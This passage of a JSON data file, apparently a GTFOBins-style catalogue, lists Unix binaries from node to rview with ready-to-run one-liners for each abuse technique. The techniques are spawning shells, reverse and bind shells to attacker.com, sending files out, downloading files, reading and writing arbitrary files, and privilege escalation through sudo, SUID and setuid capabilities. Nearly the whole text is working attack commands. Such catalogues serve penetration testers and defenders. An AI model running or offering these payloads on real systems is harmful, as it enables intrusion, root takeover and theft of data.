                "node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "node -e 'sh = child_process.spawn(\"/bin/sh\");",
                "net.connect(process.env.RPORT, process.env.RHOST, function () {",
                "  this.pipe(sh.stdin);",
                "  sh.stdout.pipe(this);",
                "  sh.stderr.pipe(this);",
                "})'"
            ]
        },
        "Bind shell": {
            "code": [
                "export LPORT=12345",
                "node -e 'sh = child_process.spawn(\"/bin/sh\");",
                "net.createServer(function (client) {",
                "  client.pipe(sh.stdin);",
                "  sh.stdout.pipe(client);",
                "  sh.stderr.pipe(client);",
                "}).listen(process.env.LPORT)'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com",
                "export LFILE=file_to_send",
                "node -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "node -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'"
            ]
        },
        "File write": {
            "code": [
                "node -e 'fs.writeFileSync(\"file_to_write\", \"DATA\")'"
            ]
        },
        "File read": {
            "code": [
                "node -e 'process.stdout.write(fs.readFileSync(\"/bin/ls\"))'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which node) .",
                "",
                "./node -e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which node) .",
                "sudo setcap cap_setuid+ep node",
                "",
                "./node -e 'process.setuid(0); child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
            ]
        }
    },
    "nohup": {
        "Shell": {
            "code": [
                "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
            ]
        },
        "Command": {
            "code": [
                "COMMAND='/usr/bin/id'",
                "nohup \"$COMMAND\"",
                "cat nohup.out"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which nohup) .",
                "",
                "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
            ]
        }
    },
    "npm": {
        "Shell": {
            "code": [
                "npm exec /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json",
                "sudo npm -C $TF --unsafe-perm i"
            ]
        }
    },
    "nroff": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "echo '#!/bin/sh' > $TF/groff",
                "echo '/bin/sh' >> $TF/groff",
                "chmod +x $TF/groff",
                "GROFF_BIN_PATH=$TF nroff"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "nroff $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo '#!/bin/sh' > $TF/groff",
                "echo '/bin/sh' >> $TF/groff",
                "chmod +x $TF/groff",
                "sudo GROFF_BIN_PATH=$TF nroff"
            ]
        }
    },
    "nsenter": {
        "Shell": {
            "code": [
                "nsenter /bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo nsenter /bin/sh"
            ]
        }
    },
    "octave": {
        "Shell": {
            "code": [
                "octave-cli --eval 'system(\"/bin/sh\")'"
            ]
        },
        "File write": {
            "code": [
                "octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"
            ]
        },
        "File read": {
            "code": [
                "octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo octave-cli --eval 'system(\"/bin/sh\")'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which octave) .",
                "",
                "./octave-cli --eval 'system(\"/bin/sh\")'"
            ]
        }
    },
    "od": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "od -An -c -w9999 \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which od) .",
                "",
                "LFILE=file_to_read",
                "./od -An -c -w9999 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo od -An -c -w9999 \"$LFILE\""
            ]
        }
    },
    "openssl": {
        "Reverse shell": {
            "code": [
                "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
                "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345",
                ""
            ]
        },
        "File upload": {
            "code": [
                "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
                "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save",
                ""
            ]
        },
        "File download": {
            "code": [
                "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
                "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send",
                ""
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "echo DATA | openssl enc -out \"$LFILE\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "openssl enc -in \"$LFILE\""
            ]
        },
        "Library load": {
            "code": [
                "openssl req -engine ./lib.so"
            ]
        },
        "SUID": {
            "code": [
                "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
                "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345",
                ""
            ]
        },
        "Sudo": {
            "code": [
                "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
                "openssl s_server -quiet -key key.pem -cert cert.pem -port 12345",
                ""
            ]
        }
    },
    "openvpn": {
        "Shell": {
            "code": [
                "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "openvpn --config \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which openvpn) .",
                "",
                "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
            ]
        }
    },
    "openvt": {
        "Sudo": {
            "code": [
                "COMMAND=id",
                "TF=$(mktemp -u)",
                "sudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"",
                "cat $TF"
            ]
        }
    },
    "paste": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "paste $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which paste) .",
                "",
                "LFILE=file_to_read",
                "paste $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo paste $LFILE"
            ]
        }
    },
    "pax": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "pax -w \"$LFILE\""
            ]
        }
    },
    "pdb": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'import os; os.system(\"/bin/sh\")' > $TF",
                "pdb $TF",
                "cont"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo 'import os; os.system(\"/bin/sh\")' > $TF",
                "sudo pdb $TF",
                "cont"
            ]
        }
    },
    "pdflatex": {
        "Shell": {
            "code": [
                "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
            ]
        },
        "File read": {
            "code": [
                "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
                "pdftotext article.pdf -"
            ]
        },
        "Sudo": {
            "code": [
                "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
                "pdftotext article.pdf -"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which pdflatex) .",
                "",
                "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
            ]
        }
    },
    "pdftex": {
        "Shell": {
            "code": [
                "pdftex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which pdftex) .",
                "",
                "./pdftex --shell-escape '\\write18{/bin/sh}\\end'"
            ]
        }
    },
    "perf": {
        "Shell": {
            "code": [
                "perf stat /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which perf) .",
                "",
                "./perf stat /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo perf stat /bin/sh"
            ]
        }
    },
    "perl": {
        "Shell": {
            "code": [
                "perl -e 'exec \"/bin/sh\";'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "perl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "perl -ne print $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which perl) .",
                "",
                "./perl -e 'exec \"/bin/sh\";'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo perl -e 'exec \"/bin/sh\";'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which perl) .",
                "sudo setcap cap_setuid+ep perl",
                "",
                "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
            ]
        }
    },
    "pg": {
        "Shell": {
            "code": [
                "pg /etc/profile",
                "!/bin/sh"
            ]
        },
        "File read": {
            "code": [
                "pg file_to_read"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which pg) .",
                "",
                "./pg file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo pg /etc/profile",
                "!/bin/sh"
            ]
        }
    },
    "php": {
        "Shell": {
            "code": [
                "export CMD=\"/bin/sh\"",
                "php -r 'system(getenv(\"CMD\"));'"
            ]
        },
        "Command": {
            "code": [
                "export CMD=\"id\"",
                "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "php -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ]
        },
        "File upload": {
            "code": [
                "LHOST=0.0.0.0",
                "LPORT=8888",
                "php -S $LHOST:$LPORT"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "php -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "php -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'"
            ]
        },
        "File read": {
            "code": [
                "export LFILE=file_to_read",
                "php -r 'readfile(getenv(\"LFILE\"));'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which php) .",
                "",
                "CMD=\"/bin/sh\"",
                "./php -r \"pcntl_exec('/bin/sh', ['-p']);\""
            ]
        },
        "Sudo": {
            "code": [
                "CMD=\"/bin/sh\"",
                "sudo php -r \"system('$CMD');\""
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which php) .",
                "sudo setcap cap_setuid+ep php",
                "",
                "CMD=\"/bin/sh\"",
                "./php -r \"posix_setuid(0); system('$CMD');\""
            ]
        }
    },
    "pic": {
        "Shell": {
            "code": [
                "pic -U",
                ".PS",
                "sh X sh X"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "pic $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "sudo pic -U",
                ".PS",
                "sh X sh X"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which pic) .",
                "",
                "./pic -U",
                ".PS",
                "sh X sh X"
            ]
        }
    },
    "pico": {
        "Shell": {
            "code": [
                "pico",
                "^R^X",
                "reset; sh 1>&0 2>&0"
            ]
        },
        "File write": {
            "code": [
                "pico file_to_write",
                "DATA",
                "^O"
            ]
        },
        "File read": {
            "code": [
                "pico file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo pico",
                "^R^X",
                "reset; sh 1>&0 2>&0"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which pico) .",
                "",
                "./pico -s /bin/sh",
                "/bin/sh",
                "^T"
            ]
        }
    },
    "pip": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "TF=$(mktemp -d)",
                "echo 'import sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")' > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "TF=$(mktemp -d)",
                "echo 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=/tmp/file_to_save",
                "TF=$(mktemp -d)",
                "echo 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=/tmp/file_to_save",
                "TF=$(mktemp -d)",
                "echo \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "File read": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "Library load": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py",
                "pip install $TF"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py",
                "sudo pip install $TF"
            ]
        }
    },
    "pkexec": {
        "Sudo": {
            "code": [
                "sudo pkexec /bin/sh"
            ]
        }
    },
    "pkg": {
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'id' > $TF/x.sh",
                "fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF",
                ""
            ]
        }
    },
    "pr": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "pr -T $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which pr) .",
                "",
                "LFILE=file_to_read",
                "pr -T $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "pr -T $LFILE"
            ]
        }
    },
    "pry": {
        "Shell": {
            "code": [
                "pry",
                "system(\"/bin/sh\")"
            ]
        },
        "Sudo": {
            "code": [
                "sudo pry",
                "system(\"/bin/sh\")"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which pry) .",
                "",
                "./pry",
                "system(\"/bin/sh\")"
            ]
        }
    },
    "psftp": {
        "Shell": {
            "code": [
                "psftp",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo psftp",
                "!/bin/sh"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which psftp) .",
                "",
                "sudo psftp",
                "!/bin/sh"
            ]
        }
    },
    "psql": {
        "Shell": {
            "code": [
                "psql",
                "\\?",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "psql",
                "\\?",
                "!/bin/sh"
            ]
        }
    },
    "ptx": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ptx -w 5000 \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ptx) .",
                "",
                "LFILE=file_to_read",
                "./ptx -w 5000 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ptx -w 5000 \"$LFILE\""
            ]
        }
    },
    "puppet": {
        "Shell": {
            "code": [
                "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
            ]
        },
        "File write": {
            "code": [
                "LFILE=\"/tmp/file_to_write\"",
                "puppet apply -e \"file { '$LFILE': content => 'DATA' }\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "puppet filebucket -l diff /dev/null $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
            ]
        }
    },
    "python": {
        "Shell": {
            "code": [
                "python -c 'import os; os.system(\"/bin/sh\")'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "python -c 'import sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "python -c 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "python -c 'import sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"
            ]
        },
        "File write": {
            "code": [
                "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"
            ]
        },
        "File read": {
            "code": [
                "python -c 'print(open(\"file_to_read\").read())'"
            ]
        },
        "Library load": {
            "code": [
                "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which python) .",
                "",
                "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo python -c 'import os; os.system(\"/bin/sh\")'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which python) .",
                "sudo setcap cap_setuid+ep python",
                "",
                "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
            ]
        }
    },
    "rake": {
        "Shell": {
            "code": [
                "rake -p '`/bin/sh 1>&0`'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file-to-read",
                "rake -f $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rake -p '`/bin/sh 1>&0`'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which rake) .",
                "",
                "./rake -p '`/bin/sh 1>&0`'"
            ]
        }
    },
    "readelf": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "readelf -a @$LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which readelf) .",
                "",
                "LFILE=file_to_read",
                "./readelf -a @$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo readelf -a @$LFILE"
            ]
        }
    },
    "red": {
        "File write": {
            "code": [
                "red file_to_write",
                "a",
                "DATA",
                ".",
                "w",
                "q"
            ]
        },
        "File read": {
            "code": [
                "red file_to_read",
                ",p",
                "q"
            ]
        },
        "Sudo": {
            "code": [
                "sudo red file_to_write",
                "a",
                "DATA",
                ".",
                "w",
                "q"
            ]
        }
    },
    "redcarpet": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "redcarpet \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo redcarpet \"$LFILE\""
            ]
        }
    },
    "restic": {
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_or_dir_to_get",
                "NAME=backup_name",
                "restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which restic) .",
                "",
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_or_dir_to_get",
                "NAME=backup_name",
                "./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_or_dir_to_get",
                "NAME=backup_name",
                "sudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
            ]
        }
    },
    "rev": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "rev $LFILE | rev"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which rev) .",
                "",
                "LFILE=file_to_read",
                "./rev $LFILE | rev"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo rev $LFILE | rev"
            ]
        }
    },
    "rlogin": {
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_send",
                "rlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"
            ]
        }
    },
    "rlwrap": {
        "Shell": {
            "code": [
                "rlwrap /bin/sh"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "rlwrap -l \"$LFILE\" echo DATA"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which rlwrap) .",
                "",
                "./rlwrap -H /dev/null /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rlwrap /bin/sh"
            ]
        }
    },
    "rpm": {
        "Shell": {
            "code": [
                "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which rpm) .",
                "",
                "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
            ]
        }
    },
    "rpmquery": {
        "Shell": {
            "code": [
                "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which rpmquery) .",
                "",
                "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"
            ]
        }
    },
    "rsync": {
        "Shell": {
            "code": [
                "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which rsync) .",
                "",
                "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
            ]
        }
    },
    "ruby": {
        "Shell": {
            "code": [
                "ruby -e 'exec \"/bin/sh\"'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
            ]
        },
        "File upload": {
            "code": [
                "export LPORT=8888",
                "ruby -run -e httpd . -p $LPORT"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "ruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'"
            ]
        },
        "File write": {
            "code": [
                "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"
            ]
        },
        "File read": {
            "code": [
                "ruby -e 'puts File.read(\"file_to_read\")'"
            ]
        },
        "Library load": {
            "code": [
                "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ruby -e 'exec \"/bin/sh\"'"
            ]
        },
        "Capabilities": {
            "code": [
                "cp $(which ruby) .",
                "sudo setcap cap_setuid+ep ruby",
                "",
                "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
            ]
        }
    },
    "run-mailcap": {
        "Shell": {
            "code": [
                "run-mailcap --action=view /etc/hosts",
                "!/bin/sh"
            ]
        },
        "File write": {
            "code": [
                "run-mailcap --action=edit file_to_read"
            ]
        },
        "File read": {
            "code": [
                "run-mailcap --action=view file_to_read"
            ]
        },
        "Sudo": {
            "code": [
                "sudo run-mailcap --action=view /etc/hosts",
                "!/bin/sh"
            ]
        }
    },
    "run-parts": {
        "Shell": {
            "code": [
                "run-parts --new-session --regex '^sh$' /bin"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which run-parts) .",
                "",
                "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo run-parts --new-session --regex '^sh$' /bin"
            ]
        }
    },
    "rview": {
        "Shell": {
            "code": [
                "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
                "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
                "pty.spawn(\"/bin/sh\")",
                "vim.command(\":q!\")'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "rview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
                "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
                "  while true do",
                "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));t:send(b);",
                "  end;",
                "  f:close();t:close();'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "export LPORT=12345",
                "rview -c ':lua local k=require(\"socket\");",
                "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
                "  local c=s:accept();",
                "  while true do",
                "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
                "    local b=assert(f:read(\"*a\"));c:send(b);",
                "  end;c:close();f:close();'"
            ]
        },
        "File upload": {
            "code": [
                "export URL=http://attacker.com/",
                "export LFILE=file_to_send",
                "rview -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",
                "else: import urllib as u, urllib2 as r",
                "r.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))",
                "vim.command(\":q!\")'"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "export LFILE=file_to_save",
                "rview -c ':py import vim,sys; from os import environ as e",
                "if sys.version_info.major == 3: import urllib.request as r",
                "else: import urllib as r",
                "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])",
                "vim.command(\":q!\")'"
            ]
        },
        "File write": {
            "code": [
                "rview file_to_write",
                "iDATA",
                "^[",
                "w!"
            ]
        },
        "File read": {
            "code": [
                "rview file_to_read"
            ]
        },
        "Library load": {
            "code": [
                "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which rview) .",
                "",
                "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
            ]
        },
        "Sudo": {
            "code": [
                "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
